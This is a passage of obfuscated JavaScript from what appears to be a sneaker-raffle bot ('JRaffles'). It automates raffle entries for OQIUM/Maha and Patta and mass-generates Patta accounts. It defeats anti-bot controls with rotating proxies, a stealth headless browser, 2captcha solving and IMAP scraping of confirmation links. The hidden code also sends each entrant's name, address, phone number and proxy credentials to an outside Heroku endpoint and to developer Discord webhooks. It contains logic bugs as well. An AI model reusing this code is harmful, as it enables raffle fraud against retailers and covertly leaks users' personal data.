                                if (_0x4c1ac5[_0x3fcad5]['Size'] == 'RANDOM') {
                                }
                                _0x44be79['data']['attributes']['properties']['$first_name'] = '' + _0x4c1ac5[_0x3fcad5]['FirstName'], _0x44be79['data']['attributes']['properties']['$last_name'] = '' + _0x4c1ac5[_0x3fcad5]['LastName'], _0x44be79['data']['attributes']['properties']['$address1'] = _0x4c1ac5[_0x3fcad5]['Address1'] + '\x20' + _0x4c1ac5[_0x3fcad5]['Address2'] + '\x20' + _0x4c1ac5[_0x3fcad5]['HouseNumber'], _0x44be79['data']['attributes']['properties']['$zip'] = '' + _0x4c1ac5[_0x3fcad5]['Zip'], _0x44be79['data']['attributes']['properties']['$city'] = '' + _0x4c1ac5[_0x3fcad5]['City'], _0x44be79['data']['attributes']['properties']['$country'] = '' + _0x4c1ac5[_0x3fcad5]['Country'], _0x4c1ac5[_0x3fcad5]['Size'] == 'RANDOM' ? _0x44be79['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x157e8f[_0x1c6004] : _0x44be79['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4c1ac5[_0x3fcad5]['Size'], _0x44be79['data']['attributes']['properties']['$phone_number'] = '' + _0x4c1ac5[_0x3fcad5]['Phone'], _0x44be79['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4c1ac5[_0x3fcad5]['Follower'];
                            }
                            if (_0x50b722['useRandomProxy'] = ![])
                                var _0x47a030 = _0x34dccc[_0x3fcad5]['split'](':');
                            else
                                var _0xff1f5e = Math['round'](Math['random']() * (_0x34dccc['length'] - 0x1)), _0x47a030 = _0x34dccc[_0xff1f5e]['split'](':');
                            var _0x1b2e09 = {
                                'jar': _0x15c37f,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3e1a07['url'],
                                'headers': _0x3e1a07['headers'],
                                'body': JSON['stringify'](_0x44be79),
                                'proxy': 'http://' + _0x47a030[0x2] + ':' + _0x47a030[0x3] + '@' + _0x47a030[0x0] + ':' + _0x47a030[0x1]
                            };
                            return _0x18eda4 != 'ver' && (_0x1b2e09['url'] = _0x3e1a07['url'], _0x1b2e09['headers'] = _0x3e1a07['headers']), _0x18eda4 == 'ver' && (_0x1b2e09['method'] = 'GET'), new Promise(function (_0x30dbda, _0x28f1dc) {
                                callback = async (_0x3142fe, _0x45d1fe, _0x247b3a) => {
                                    if (!_0x3142fe && _0x45d1fe['statusCode'] == 0xca || !_0x3142fe && _0x45d1fe['statusCode'] == 0xc8) {
                                        if (_0x18eda4 != 'ver') {
                                            var _0x1bc06d = await _0xc964cf(_0x4c1ac5[_0x3fcad5], _0x3e1a07, 'dev', ![]), _0x24d013 = await _0xc964cf(_0x4c1ac5[_0x3fcad5], _0x3e1a07, 'pub', ![]);
                                            const _0x2d974f = {
                                                'succesDEVMSG': { 'embeds': [_0x1bc06d] },
                                                'succesPUBMSG': { 'embeds': [_0x24d013] }
                                            };
                                            let _0x88d09b = _0x4c1ac5[_0x3fcad5];
                                            try {
                                                prxdata = {
                                                    'username': _0x4ee077['replace']('#', ''),
                                                    'module': _0x3e1a07['name'],
                                                    'entrydata': JSON['stringify'](_0x88d09b),
                                                    'proxy': '' + _0x34dccc[_0x3fcad5]
                                                };
                                                var _0x51fbf1 = JSON['stringify'](prxdata);
                                                let _0x17170b = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x51fbf1, _0x17170b);
                                            } catch (_0x5cbdcb) {
                                            }
                                            if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                                try {
                                                    await _0x33437b(_0x50b722['webhook'], _0x2d974f['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x2d974f['succesDEVMSG']), await _0xfa5357(0xc8);
                                            try {
                                                await _0x33437b(_0x471d14, _0x2d974f['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x253d32(_0x4c1ac5[_0x3fcad5], _0x3e1a07);
                                        }
                                        _0x30dbda(console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x3e1a07['name'] + ']\x20Task\x20' + (_0x3fcad5 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x18eda4 != 'ver') {
                                            var _0x580f2f = '' + _0x3142fe, _0x437346 = await _0xc964cf(_0x4c1ac5[_0x3fcad5], _0x3e1a07, 'dev', !![], _0x580f2f), _0x2a4668 = {};
                                            _0x2a4668['errorDEV'] = { 'embeds': [_0x437346] }, _0x3003c7(_0x4c1ac5[_0x3fcad5], _0x3e1a07), _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x2a4668['errorDEV']), await _0x33437b(_0x5e1645, _0x2a4668['errorDEV']);
                                        }
                                        _0x28f1dc(console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x3e1a07['name'] + ']\x20Task\x20' + (_0x3fcad5 + 0x1) + ':\x20' + _0x3142fe)));
                                    }
                                };
                                try {
                                    _0x18eda4 != 'ver' && console['log'](_0x391006() + '\x20[' + _0x3e1a07['name'] + ']\x20Task\x20' + (_0x3fcad5 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x44be79['data']['attributes']['email']), _0x5b7593(_0x1b2e09, callback);
                                } catch (_0x3b4ec0) {
                                    console['log'](_0x391006() + '\x20Task\x20' + (_0x3fcad5 + 0x1) + ':\x20' + _0x3b4ec0);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x24c607(_0x23c471, 'nor', _0x235928, _0x151c7c, _0x5f363c), console['log'](_0x391006() + '\x20[' + _0x235928['name'] + ']\x20Sleeping\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        } catch (_0x1e4875) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5eddd2, _0x3e3e7d, _0x22f345) {
                    var _0x3e3e7d = [], _0x1186a0 = ![];
                    async function _0x14f3e6() {
                        var _0x22e04d = new _0x108c6b({
                            'user': _0x50b722['masterMail'],
                            'password': _0x50b722['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xf8d66a(_0x28585b) {
                            _0x22e04d['openBox']('INBOX', ![], _0x28585b);
                        }
                        _0x22e04d['once']('ready', function () {
                            _0xf8d66a(function (_0x54a005, _0x1306e3) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x54a005)
                                    throw _0x54a005;
                                _0x22e04d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x22779a, _0x46355f) {
                                    if (!_0x46355f || !_0x46355f['length'])
                                        console['log'](_0x391006() + '\x20[' + _0x5eddd2['name'] + ']\x20No\x20mails\x20found'), _0x22e04d['end']();
                                    else {
                                        var _0x987cc1 = _0x22e04d['seq']['fetch'](_0x46355f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x987cc1['on']('message', function (_0x244193, _0x40fd7d) {
                                            var _0x2dc4d5 = '(#' + _0x40fd7d + ')\x20';
                                            _0x244193['on']('body', function (_0x5215f1, _0x57b218) {
                                                _0x2e7895(_0x5215f1, (_0x20c55f, _0x2fbf1c) => {
                                                    var _0x866ea3 = _0x2fbf1c['text']['split']('(')[0x1], _0xd7d7df = _0x866ea3['split'](')')[0x0];
                                                    _0x3e3e7d['push'](_0xd7d7df);
                                                });
                                            }), _0x244193['once']('end', function () {
                                            });
                                        }), _0x987cc1['once']('error', function (_0x465036) {
                                            console['log']('Fetch\x20error:\x20' + _0x465036), _0x1186a0 = !![];
                                        }), _0x987cc1['once']('end', function () {
                                            _0x22e04d['end'](), _0x1186a0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x22e04d['once']('error', function (_0x2736af) {
                            console['log'](_0x2736af), _0x1186a0 = !![];
                        }), _0x22e04d['once']('end', async function () {
                            _0x1186a0 = !![];
                        }), _0x22e04d['connect']();
                    }
                    async function _0x283135(_0x229691, _0x563d4d, _0x4fc206) {
                        for (var _0x257fd5 = 0x0; _0x257fd5 < _0x563d4d['length']; _0x257fd5++) {
                            async function _0x252d9d(_0x36fab2, _0x105491, _0x30a0c7, _0x38ba06, _0x5231c7) {
                                var _0x13d4cb, _0x2048ca = {}, _0xc119ee = [], _0x309e3b = {}, _0x3f48f8 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x29d266 = Math['round'](Math['random']() * (_0x3f48f8['length'] - 0x1));
                                _0x38ba06[_0x36fab2]['Size'] == 'RANDOM' && (_0x38ba06[_0x36fab2]['Size'] = _0x3f48f8[_0x29d266]);
                                !_0x38ba06 && (_0x38ba06 = {});
                                if (_0x50b722['useRandomProxy'] = ![])
                                    var _0x56a218 = _0x5231c7[_0x36fab2]['split'](':');
                                else
                                    var _0x1b49f3 = Math['round'](Math['random']() * (_0x5231c7['length'] - 0x1)), _0x56a218 = _0x5231c7[_0x1b49f3]['split'](':');
                                var _0x10c05a = {
                                    'jar': _0x15c37f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x30a0c7['url'],
                                    'headers': _0x30a0c7['headers'],
                                    'body': JSON['stringify'](_0x2048ca),
                                    'proxy': 'http://' + _0x56a218[0x2] + ':' + _0x56a218[0x3] + '@' + _0x56a218[0x0] + ':' + _0x56a218[0x1]
                                };
                                return _0x105491 != 'ver' && (_0x10c05a['url'] = _0x30a0c7['url'], _0x10c05a['headers'] = _0x30a0c7['headers']), _0x105491 == 'ver' && (_0x10c05a['method'] = 'GET', _0x10c05a['url'] = _0x38ba06[_0x36fab2]), new Promise(function (_0x533805, _0x3705c5) {
                                    callback = async (_0x4a62ab, _0x4c74b1, _0x3187f9) => {
                                        if (!_0x4a62ab && _0x4c74b1['statusCode'] == 0xca || !_0x4a62ab && _0x4c74b1['statusCode'] == 0xc8) {
                                            if (_0x105491 != 'ver') {
                                                var _0xc07724 = await _0xc964cf(_0x38ba06[_0x36fab2], _0x30a0c7, 'dev', ![]), _0x4e2894 = await _0xc964cf(_0x38ba06[_0x36fab2], _0x30a0c7, 'pub', ![]);
                                                const _0x1e1872 = {
                                                    'succesDEVMSG': { 'embeds': [_0xc07724] },
                                                    'succesPUBMSG': { 'embeds': [_0x4e2894] }
                                                };
                                                if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                                    try {
                                                        await _0x33437b(_0x50b722['webhook'], _0x1e1872['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x1e1872['succesDEVMSG']), await _0xfa5357(0xc8);
                                                try {
                                                    await _0x33437b(_0x471d14, _0x1e1872['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x253d32(_0x38ba06[_0x36fab2], _0x30a0c7);
                                            }
                                            _0x533805(console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x30a0c7['name'] + ']\x20Task\x20' + (_0x36fab2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x105491 != 'ver') {
                                                var _0x1783fb = '' + _0x4a62ab, _0x31e23b = await _0xc964cf(_0x38ba06[_0x36fab2], _0x30a0c7, 'dev', !![], _0x1783fb), _0x394db5 = {};
                                                _0x394db5['errorDEV'] = { 'embeds': [_0x31e23b] }, _0x3003c7(_0x38ba06[_0x36fab2], _0x30a0c7), _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x394db5['errorDEV']), await _0x33437b(_0x5e1645, _0x394db5['errorDEV']);
                                            }
                                            _0x3705c5(console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x30a0c7['name'] + ']\x20Task\x20' + (_0x36fab2 + 0x1) + ':\x20' + _0x4a62ab)));
                                        }
                                    };
                                    try {
                                        _0x105491 != 'ver' ? console['log'](_0x391006() + '\x20[' + _0x30a0c7['name'] + ']\x20Task\x20' + (_0x36fab2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2048ca['data']['attributes']['email']) : console['log'](_0x391006() + '\x20[' + _0x30a0c7['name'] + ']\x20Task\x20' + (_0x36fab2 + 0x1) + ':\x20Fetching\x20Response'), _0x5b7593(_0x10c05a, callback);
                                    } catch (_0x1f1da0) {
                                        console['log'](_0x391006() + '\x20Task\x20' + (_0x36fab2 + 0x1) + ':\x20' + _0x1f1da0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x252d9d(_0x257fd5, 'ver', _0x229691, _0x563d4d, _0x4fc206), console['log'](_0x391006() + '\x20[' + _0x229691['name'] + ']\x20Sleeping\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                            } catch (_0x3657f2) {
                            }
                        }
                    }
                    try {
                        _0x14f3e6();
                        while (!_0x1186a0) {
                            await _0xfa5357(0xfa0);
                        }
                        console['log']('Found\x20' + _0x3e3e7d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x283135(_0x5eddd2, _0x3e3e7d, _0x22f345);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x262f2e, _0x137d08, _0x2900da) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2ded17 = 0x0; _0x2ded17 < _0x137d08['length']; _0x2ded17++) {
                        var _0x3e94bc = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ee077
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x50b722['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1f5435
                                }
                            ]
                        }];
                        const _0x13214d = { 'embeds': _0x3e94bc };
                        _0x3b7620(_0x262f2e['name'] + '\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20/\x20' + _0x137d08['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        try {
                            await _0x559c6d(_0x137d08, _0x2ded17);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5e6de4 = await _0xc964cf(_0x137d08[_0x2ded17], _0x262f2e, 'acc', ![]);
                        const _0x2ab121 = { 'succesDEVMSG': { 'embeds': [_0x5e6de4] } };
                        if (_0x137d08[_0x2ded17]['Email'] == '' || _0x137d08[_0x2ded17]['FirstName'] == '' || _0x137d08[_0x2ded17]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xfa5357(0x7d0);
                            continue;
                        }
                        (_0x137d08[_0x2ded17]['Password'] == '' || _0x137d08[_0x2ded17] == undefined) && _0x137d08[_0x2ded17]['Password'] == 'JRaffles23!';
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x28eac2 = _0x2900da[_0x2ded17]['split'](':');
                        else
                            var _0x4a2776 = Math['round'](Math['random']() * (_0x2900da['length'] - 0x1)), _0x28eac2 = _0x2900da[_0x4a2776]['split'](':');
                        var _0x14d0aa;
                        try {
                            _0x14d0aa = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28eac2[0x0] + ':' + _0x28eac2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x14d0aa = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28eac2[0x0] + ':' + _0x28eac2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1839b6 = await _0x14d0aa['newPage']();
                            await _0x1839b6['authenticate']({
                                'username': '' + _0x28eac2[0x2],
                                'password': '' + _0x28eac2[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x262f2e['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1839b6['setRequestInterception'](!![]), _0x1839b6['on']('request', _0x26f519 => {
                                _0x26f519['resourceType']() === 'image' || _0x26f519['resourceType']() === 'font' || _0x26f519['resourceType']() === 'media' ? _0x26f519['abort']() : _0x26f519['continue']();
                            }), await _0x1839b6['goto']('https://patta.nl/account/register'), await _0xfa5357(0xbb8), await _0x1839b6['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x391006() + '\x20[' + _0x262f2e['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Filling\x20information'), await _0x1839b6['type']('#RegisterForm-FirstName', '' + _0x137d08[_0x2ded17]['FirstName']), await _0xfa5357(0x226), await _0x1839b6['type']('#RegisterForm-LastName', '' + _0x137d08[_0x2ded17]['LastName']), await _0xfa5357(0x226), await _0x1839b6['type']('#RegisterForm-email', '' + _0x137d08[_0x2ded17]['Email']), await _0xfa5357(0x226), await _0x1839b6['type']('#RegisterForm-password', '' + _0x137d08[_0x2ded17]['Password']), await _0xfa5357(0x226), console['log'](_0x391006() + '\x20[' + _0x262f2e['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Submitting..'), await _0x1839b6['$eval']('#RegisterForm', _0x56351b => _0x56351b['submit']()), await _0xfa5357(0x1f40);
                            try {
                                await _0x1839b6['waitForSelector']('.home-page-grid__collection'), await _0xfa5357(0x1f4), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x262f2e['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Account\x20' + _0x137d08[_0x2ded17]['Email'] + '\x20Generated!')), _0x13dabd['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x137d08[_0x2ded17]['Email'] + ',' + _0x137d08[_0x2ded17]['Password']), console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x262f2e['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Account\x20' + _0x137d08[_0x2ded17]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x2ab121['succesDEVMSG']);
                                } catch {
                                }
                                await _0x33437b(_0x96b204, _0x2ab121['succesDEVMSG']);
                            } catch (_0x3f6aeb) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3f6aeb));
                            }
                        } catch (_0x429161) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x2ded17 + 0x1) + '\x20:\x20' + _0x429161));
                        } finally {
                            _0x14d0aa && _0x14d0aa['close'](), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3f1937, _0x291f75, _0x434164) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5e7be4 = 0x0; _0x5e7be4 < _0x291f75['length']; _0x5e7be4++) {
                        var _0x561383;
                        if (_0x3f51b4 != 'yes')
                            var _0x3f51b4 = '', _0x23ceb2 = 0x0;
                        _0x3b7620(_0x3f1937['name'] + '\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20/\x20' + _0x291f75['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        try {
                            await _0x559c6d(_0x291f75, _0x5e7be4);
                        } catch {
                            _0x3f51b4 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x291f75[_0x5e7be4]['Email'] == '' || _0x291f75[_0x5e7be4]['Password'] == '' || _0x291f75[_0x5e7be4]['FirstName'] == '' || _0x291f75[_0x5e7be4]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x5273d6 = _0x434164[_0x5e7be4]['split'](':');
                        else
                            var _0x45a985 = Math['round'](Math['random']() * (_0x434164['length'] - 0x1)), _0x5273d6 = _0x434164[_0x45a985]['split'](':');
                        var _0x1cc7fa;
                        try {
                            _0x1cc7fa = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5273d6[0x0] + ':' + _0x5273d6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1cc7fa = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5273d6[0x0] + ':' + _0x5273d6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x23d3e0 = await _0x1cc7fa['newPage']();
                            await _0x23d3e0['authenticate']({
                                'username': '' + _0x5273d6[0x2],
                                'password': '' + _0x5273d6[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x23d3e0['setRequestInterception'](!![]), _0x23d3e0['on']('request', _0x1d8fbc => {
                                _0x1d8fbc['resourceType']() === 'image' || _0x1d8fbc['resourceType']() === 'font' || _0x1d8fbc['resourceType']() === 'media' ? _0x1d8fbc['abort']() : _0x1d8fbc['continue']();
                            }), await _0x23d3e0['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x23d3e0['waitForSelector']('#CustomerEmail'), console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x23d3e0['type']('#CustomerEmail', '' + _0x291f75[_0x5e7be4]['Email']), await _0xfa5357(0x12c), await _0x23d3e0['type']('#CustomerPassword', '' + _0x291f75[_0x5e7be4]['Password']), await _0xfa5357(0x226), await _0x23d3e0['$eval']('#customer_login', _0x1fedb8 => _0x1fedb8['submit']());
                            try {
                                await _0x23d3e0['waitForSelector']('#orders'), await _0xfa5357(0x4b0);
                            } catch {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x23d3e0['goto']('' + _0x291f75[_0x5e7be4]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xfa5357(0xbb8), console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x23d3e0['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x23d3e0['type']('#email', '' + _0x291f75[_0x5e7be4]['Email']), await _0xfa5357(0x384), await _0x23d3e0['type']('#first_name', '' + _0x291f75[_0x5e7be4]['FirstName']), await _0xfa5357(0x514), await _0x23d3e0['type']('#last_name', '' + _0x291f75[_0x5e7be4]['LastName']), await _0xfa5357(0x514), await _0x23d3e0['type']('#street_address', _0x291f75[_0x5e7be4]['Address1'] + '\x20' + _0x291f75[_0x5e7be4]['HouseNumber'] + '\x20' + _0x291f75[_0x5e7be4]['Address2']), await _0xfa5357(0x2bc);
                            _0x291f75[_0x5e7be4]['Postcode'] == undefined && (_0x291f75[_0x5e7be4]['Postcode'] = _0x291f75[_0x5e7be4]['Zip']);
                            await _0x23d3e0['type']('#zip_code', '' + _0x291f75[_0x5e7be4]['Postcode']), await _0xfa5357(0x320), await _0x23d3e0['type']('#city', '' + _0x291f75[_0x5e7be4]['City']), await _0xfa5357(0x320), await _0x23d3e0['type']('#bday', '01/01/1994'), await _0xfa5357(0x320), await _0x23d3e0['type']('#instagram', '' + _0x291f75[_0x5e7be4]['Follower']), await _0xfa5357(0x352);
                            if (_0x291f75[_0x5e7be4]['Size'] == 'RANDOM') {
                                const _0x17cfc8 = await _0x23d3e0['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1e0b13 => {
                                    return _0x1e0b13['map'](_0x4627af => _0x4627af['textContent']);
                                });
                                var _0x371c86 = Math['round'](Math['random']() * (_0x17cfc8['length'] - 0x1));
                                console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x17cfc8[_0x371c86]), await _0x23d3e0['click']('label[data-eu-size=\x22' + _0x17cfc8[_0x371c86] + '\x22]');
                            } else {
                                console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x291f75[_0x5e7be4]['Size']);
                                try {
                                    await _0x23d3e0['click']('label[data-eu-size=\x22' + _0x291f75[_0x5e7be4]['Size'] + '\x22]');
                                } catch {
                                    await _0x23d3e0['click']('label[data-eu-size=\x22' + _0x291f75[_0x5e7be4]['Size'] + '.0\x22]');
                                }
                            }
                            await _0xfa5357(0xbb8), await _0x23d3e0['$$eval']('.raffle__checkbox-label', _0x486c69 => _0x486c69['forEach'](_0x37b237 => _0x37b237['click']())), await _0xfa5357(0x7d0), console['log'](_0x391006() + '\x20[' + _0x3f1937['name'] + ']\x20Task\x20' + (_0x5e7be4 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x23d3e0['click']('#raffle__form-submit'), await _0xfa5357(0x1388);
                            try {
